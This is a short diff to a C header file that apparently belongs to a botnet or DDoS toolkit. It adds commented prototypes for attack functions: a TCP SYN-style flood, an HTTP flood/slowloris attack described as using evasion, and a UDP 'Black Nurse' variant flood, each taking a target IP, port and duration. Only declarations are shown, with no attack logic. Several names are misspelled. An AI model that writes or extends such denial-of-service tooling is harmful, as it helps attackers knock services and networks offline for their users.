@@ -60,5 +60,12 @@ uint8_t parse_command_from_buffer(uint8_t []);
 
 
 //Attack inits
+
+/* TCP ESSYNC Attack */
 void atk_start_tcp_essyn(char *target_ip, int target_port, int duration);
+
+/* HTTP Flood / Slowris (Evasion Technology) attack */
 void start_httplankton_attack(char *target_ip, int target_port, int duration);
+
+/* UDP Black Nurse variant L4 attack */
+void start_blue_nurse_flood(char *host, int seconds, int psize, int forks);
